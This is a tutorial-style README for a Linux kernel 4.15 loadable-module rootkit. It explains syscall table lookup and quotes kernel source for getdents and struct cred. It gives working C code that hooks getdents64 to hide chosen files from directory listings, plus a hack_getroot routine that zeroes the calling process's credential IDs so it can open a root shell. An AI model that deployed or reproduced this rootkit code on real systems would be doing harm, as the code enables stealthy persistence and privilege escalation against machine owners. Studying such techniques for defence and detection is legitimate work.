# rootkit

based on linux kernel 4.15, default for ubuntu 16.04LTS



## 0.Background Knowledge & Misc

​	Rootkit is a kind of kernel module, it gets loaded to the kernel and provide functions for the attacker from kernel space. Refer to the reference link 1 to find out some basic introduction about linux kernel module.

​	Refer to the reference link 2 to find out some introduction about linux kernel rootkit.



### ways to get syscall table load address

#### 1.The simplest way: *kallsyms_lookup_name()*

*kallsyms_lookup_name()* is defined in *linux/kallsyms.h*, it take a symbol name as input and return its load address. There is a global variable name *sys_call_table* which stores the load address of syscall table.

```c
#include <linux/kallsyms.h>

static unsigned long get_syscall_table(void){
    unsigned long addr;
    addr = kallsyms_lookup_name("sys_call_table");
    if(!addr) return 0;
    syscall_table_load = (void**)addr;
    return addr;
}
```

#### 2.scan the memory

#### 3.read /proc/kallsyms



Method 2 is a little bit complicate comparing with method1. Method 3 is not that practical, for opening and reading a file in kernel space is not easy



Refer to [this post](https://infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking-8f1bc0bd099c) for some more details



### ways to get current task_struct

​	When debuging a kernel with debug info, there is a global variable names *current_task* pointing to current *task_struct*. When programing a kernel module, there is a macro *current* which will give us the pointer to the current *task_struct*, the macro is defined in *arch/x86/include/asm/current.h*(for x86 machine).





## 1.Hide Files

### linux kernel syscall: getdents

​	The kernel provide a syscall names *getdents* for iterating through a directory and return its entris. That is exactly how the *ls* find files inside a directory. Let's strace a *ls* command and see how it works

![2021-10-13_22-21-36](./pic/2021-10-13_22-21-36.png)

​	*ls* made a lot of syscalls, but we only need to pay attention to  the 2 getdents64() syscalls. Generally speaking, *ls* opens the directory, pass its fd to *getdents* and get contents in it. Let's check how the syscall is implemented in Linux.



​	The syscall *getdents()*  was defined in fs/readdir.c

```c
SYSCALL_DEFINE3(getdents64, unsigned int, fd,
		struct linux_dirent64 __user *, dirent, unsigned int, count)
{
	struct fd f;
	struct linux_dirent64 __user * lastdirent;
	struct getdents_callback64 buf = {
		.ctx.actor = filldir64,
		.count = count,
		.current_dir = dirent
	};
	int error;

	if (!access_ok(VERIFY_WRITE, dirent, count))
		return -EFAULT;

	f = fdget_pos(fd);
	if (!f.file)
		return -EBADF;

	error = iterate_dir(f.file, &buf.ctx);
	if (error >= 0)
		error = buf.error;
	lastdirent = buf.previous;
	if (lastdirent) {
		typeof(lastdirent->d_off) d_off = buf.ctx.pos;
		if (__put_user(d_off, &lastdirent->d_off))
			error = -EFAULT;
		else
			error = count - buf.count;
	}
	fdput_pos(f);
	return error;
}
```



*getdents()* calls *iterate_dir()*, which is also defined in fs/readdir.c



```c
int iterate_dir(struct file *file, struct dir_context *ctx)
{
	struct inode *inode = file_inode(file);
	bool shared = false;
	int res = -ENOTDIR;
	if (file->f_op->iterate_shared)
		shared = true;
	else if (!file->f_op->iterate)
		goto out;

	res = security_file_permission(file, MAY_READ);
	if (res)
		goto out;

	if (shared)
		res = down_read_killable(&inode->i_rwsem);
	else
		res = down_write_killable(&inode->i_rwsem);
	if (res)
		goto out;

	res = -ENOENT;
	if (!IS_DEADDIR(inode)) {
		ctx->pos = file->f_pos;
		if (shared)
			res = file->f_op->iterate_shared(file, ctx);
		else
			res = file->f_op->iterate(file, ctx);
		file->f_pos = ctx->pos;
		fsnotify_access(file);
		file_accessed(file);
	}
	if (shared)
		inode_unlock_shared(inode);
	else
		inode_unlock(inode);
out:
	return res;
}
```



*iterate_dir()* calls *file->f_op->iterate()* or *file->f_op_iterate_shared()*, which are function pointers in *file_operation* of the *file* struct. For ext4 filesystem, *iterate_dir()* calls the latter one, which is defined in fs/ext4/dir.c

```c
static int ext4_dx_readdir(struct file *file, struct dir_context *ctx)
{
	struct dir_private_info *info = file->private_data;
	struct inode *inode = file_inode(file);
	struct fname *fname;
	int	ret;

	if (!info) {
		info = ext4_htree_create_dir_info(file, ctx->pos);
		if (!info)
			return -ENOMEM;
		file->private_data = info;
	}

	if (ctx->pos == ext4_get_htree_eof(file))
		return 0;	/* EOF */
.....
    
```



​	It's a long function which actually does the readdir operation. 



​	The user pass three parameters to the *getdents()*: (1) an fd pointer to which dir you want to read; (2) a pointer to a user space buffer, which will be used by the *getdents()* to write directory entries into; (3) a unsigned int specify the buffer len. 

​	And *getdents()* calls *iterate()* or *iterate_share()* share, which is defined in the *file_operation* struct of the *file* struct of the fd. The *iterate()* will do the actual job and write the directory entris to the user space buffer.

​	Each write back directory entry is in the form of *linux_dirent*,  defined as follows, read *man getdent* for more detail

```c
struct linux_dirent {
               unsigned long  d_ino;     /* Inode number */
               unsigned long  d_off;     /* Offset to next linux_dirent */
               unsigned short d_reclen;  /* Length of this linux_dirent */
               char           d_name[];  /* Filename (null-terminated) */
                                 /* length is actually (d_reclen - 2 -
                                    offsetof(struct linux_dirent, d_name)) */
               /*
               char           pad;       // Zero padding byte
               char           d_type;    // File type (only since Linux
                                         // 2.6.4); offset is (d_reclen - 1)
               */
           }
```

​	We only need to pay attention to *d_reclen*, which tells us how long this entry is so we can move to the next one, and *d_name*, which is the entry name.



​	Here is an example using the syscall *getdents()*, the code is as follows

```c
#include<sys/syscall.h>
#include<fcntl.h>
#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<assert.h>


struct linux_dirent {
    unsigned long  d_ino;
    off_t          d_off;
    unsigned short d_reclen;
    char           d_name[];
};

int main(){
    int fd;
    long int nread;
    char buf[4096];     // the buffer that accepts write back info of getdents()
    struct linux_dirent* p;

    fd = open("/", O_DIRECTORY);
    if(fd == -1){
        perror("[-] open file failed");
        exit(-1);
    }

    nread = syscall(SYS_getdents, fd, buf, 4096);
    if(nread == -1){
        perror("[-] syscall(getdents) failed");
        exit(-1);
    }

    printf("[+] read %ld bytes by getdents()\n", nread);
    for(int pos=0;pos<nread;){
        p = (struct linux_dirent*)(buf + pos);
        printf("{d_ino=%lu, d_off=%ld, d_reclen=%hu, d_name=%s}\n", p->d_ino, p->d_off, p->d_reclen, p->d_name);
        pos += p->d_reclen; // move to the next linux_dirent
    }
    return 0;
}

```

We opens the root directory and get  its entris by calling *getdents()* directly, here is what it gives us

![2021-10-12_20-02-25](./pic/2021-10-12_20-02-25.png)



For 64-bit kernels things are slightly different. The struct *linux_dirent* becomes *linux_dirent64*, which is defined as

```c
struct linux_dirent64 {
               ino64_t        d_ino;    /* 64-bit inode number */
               off64_t        d_off;    /* 64-bit offset to next structure */
               unsigned short d_reclen; /* Size of this dirent */
               unsigned char  d_type;   /* File type */
               char           d_name[]; /* Filename (null-terminated) */
};
```

there are some extra members in the struct, but not important enough. And the syscall becomes *getdents64*, which acts just like *getdents*



### hook *getdents()* to hide files

Based on the implementation of *getdents*, we can hide a file by

1. hijack *getdents()* syscall to our *hack_getdents()*
2. in *hack_getdents()*, we first call the real *getdents()*, store its return value. When *getdents()* returns, the directory entris have been written to the user space buffer. We can copy it to kernel space by *copy_from_user()*
3. we traverse the entris in kernel space buffer, for each entry--which is a *linux_dirent* struct---we compare the *d_name* with the file name we want to hide. If matches, we remove the entry from the buffer
4. after traversing, we copy the buffer back to user by *copy_to_user()*

implementation is as follow

```c
static int hack_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
    int retval, len_left;
    char hidename[MAX_CLOAK_FILE_NAME_LEN];
    struct linux_dirent64 *dirent_buf, *dirent_c;
    unsigned short d_len;
    retval = (*real_getdents64)(fd, dirent, count);
    if(retval > 0){ // getdents64() have returned something, copy it from userspace, traverse it to find and hide the file name we want to hide, then copy it back to userspace
        dirent_buf = (struct linux_dirent64*)kmalloc(retval, GFP_KERNEL);
        dirent_c = dirent_buf;
        copy_from_user(dirent_buf, dirent, retval);

        len_left = retval;
        while(len_left > 0){
            d_len = dirent_c->d_reclen;
            len_left -= d_len;
            if(is_file_cloaked((char*)&(dirent_c->d_name))){
                memset(hidename, 0, MAX_CLOAK_FILE_NAME_LEN);
                memcpy(&hidename, (char*)&(dirent_c->d_name), strlen((char*)&(dirent_c->d_name)));
                // the dirent is the file we want to hide, remove it from dirent_buf
                if(len_left != 0){
                    // in case the dirent is not the last one, copy memory forward to overwrite the struct
                    memmove(dirent_c, (char*)((unsigned long)dirent_c+d_len), len_left);
                }else{
                    // in case the dirent is the last one, overwrite the struct to 0
                    memset(dirent_c, 0, d_len);
                }
                retval -= d_len;
                printk("[*] successful hide file %s\n", (char*)&hidename);
                continue;
            }

            if(dirent_c->d_reclen == 0){
                // in case some fs driver not implementing the getdents() properly, unlikely?
                printk("[*] shitty fs implementation\n");
                retval -= len_left;
                len_left = 0;
            }
            if(len_left!=0) dirent_c = (struct linux_dirent64*)((unsigned long)dirent_c+d_len);
        }
        // we traversed all dirents struct returned by getdents64(), now copy the modifid buf to user
        copy_to_user(dirent, dirent_buf, retval);
        kfree(dirent_buf);
    }
    return retval;
}
```

There are some auxilary functions and data structures to help with the function, both are simple so I will ignore them.

```c
// cloak file related struct
struct cloak_file_cmd{
    char name[MAX_CLOAK_FILE_NAME_LEN];
};

struct cloak_ent{
    unsigned short buf_start;
    unsigned char name_len;
};

static int add_cloak_file_name(char* name){
    int i_buf;
    int i_ent;
    unsigned long name_len;
    // find a empty entry in cloak_ent_array
    for(i_ent=0;i_ent<MAX_CLOAK_FILE_COUNT;i_ent++){
        if(!cloak_ent_array[i_ent].name_len) break;
    }
    if(i_ent==MAX_CLOAK_FILE_COUNT && cloak_ent_array[i_ent].buf_start) return -1;  // cloak_ent_array full

    // find the tail of cloak_file_name_buf
    for(i_buf=0;i_buf<CLOAK_NAME_BUF_LEN;i_buf++){
        if(!cloak_file_name_buf[i_buf]) break;
    }
    if(i_buf==CLOAK_NAME_BUF_LEN) return -2;    // cloak_file_name_buf full

    // write the cloak file name to cloak_file_name_buf
    name_len = strlen(name);
    if(name_len > MAX_CLOAK_FILE_NAME_LEN) return -3;   // file name to cloak too long
    if(!memcpy(&cloak_file_name_buf[i_buf], name, name_len)) return -4; // write file name failed

    // write the cloak_ent_array
    cloak_ent_array[i_ent].buf_start = i_buf;
    cloak_ent_array[i_ent].name_len = (unsigned char)name_len;
    return 1;
}

static unsigned int is_file_cloaked(char* name){
    unsigned int name_len = strlen(name);
    int i_ent;
    for(i_ent=0;i_ent<MAX_CLOAK_FILE_COUNT;i_ent++){
        if(cloak_ent_array[i_ent].name_len == name_len){
            if(strnstr(&cloak_file_name_buf[cloak_ent_array[i_ent].buf_start], name, name_len)){
                return 1;
            }
        }
    }
    return 0;
}
```



The implementation is simple, yet there is a trivial flaw: the *fake_getdents64()* will hide files with the same name in the whole file system. Actually, a better implementation is: we specify a definite path for the file we want to hide, and for each call to *getdents64()* we check the fd's definite path and compare it with our file. The fd's definite path can be obtained by

```c
current_task->files.fd_array[FD].path.dentry->d_dname
current_task->files.fd_array[FD].path.dentry->d_parent->d_name
....
```

Yet the efficiency can be a problem



## 2. prompt a root shell

The security context of a process is defined in the *task_struct*, as

```c
struct task_struct {
    
    .....
    
	/* Process credentials: */

	/* Tracer's credentials at attach: */
	const struct cred __rcu		*ptracer_cred;

	/* Objective and real subjective task credentials (COW): */
	const struct cred __rcu		*real_cred;

	/* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;

    .....
        
}
```

the struct *cred* is defined as

```c
/*
 * The security context of a task
 *
 * The parts of the context break down into two categories:
 *
 *  (1) The objective context of a task.  These parts are used when some other
 *	task is attempting to affect this one.
 *
 *  (2) The subjective context.  These details are used when the task is acting
 *	upon another object, be that a file, a task, a key or whatever.
 *
 * Note that some members of this structure belong to both categories - the
 * LSM security pointer for instance.
 *
 * A task has two security pointers.  task->real_cred points to the objective
 * context that defines that task's actual details.  The objective part of this
 * context is used whenever that task is acted upon.
 *
 * task->cred points to the subjective context that defines the details of how
 * that task is going to act upon another object.  This may be overridden
 * temporarily to point to another security context, but normally points to the
 * same context as task->real_cred.
 */
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key __rcu *session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	struct rcu_head	rcu;		/* RCU deletion hook */
} __randomize_layout;

```



There are three credential for a process. For the first one, it's reasonable to assume that it stands for the tracer's credential. And the for the rest two, the documentation of *cred* struct have clearly explained how the they work

1. the *real_cred* in *task_struct* is called objective context. It is reffered to when the task is being acted on.
2. the *cred* in *task_struct* is called the subjective context, and it is reffered to when the task is trying to act on something else, like opening a file or fork a new process.



​	Generally, when we want to modify a process's credential, we only need to to modify its *cred* struct, which stands for the "subjective" context. To make a process run as root, we simply overwrite the *uid*, *gid*, *suid*, *sgid*, *euid*, *egid*, *fsuid*, *fdgid* (8 fields in total) to 0 to give a process highest credential to do almost evething, including prompt us a root shell.

​	The implementation is as follow

```c
static int hack_getroot(void){
    int* ids;
    int i;
    // the macro current is defined in arch/x86/include/asm/current.h, which will return us the pointer to current task struct
    // the cred field is defined as static, so must be changed by dereferrecing its pointer
    ids = (int*)current->cred;
    for(i=1;i<9;i++) ids[i] = 0;
    return 1;
}
```

 	We call this function from user space, and the root kit  will retset the calling function's credential, then we prompt a shell by 

```c
system("/bin/sh");
```

and it will be a root one;





​	

# Reference

1. [(nearly) Complete Linux Loadable Kernel Modules](http://www.ouah.org/LKM_HACKING.html#I.3.)
2. [The Linux Kernel Module Programming Guide](https://tldp.org/LDP/lkmpg/2.6/html/lkmpg.html#AEN40)
3. 

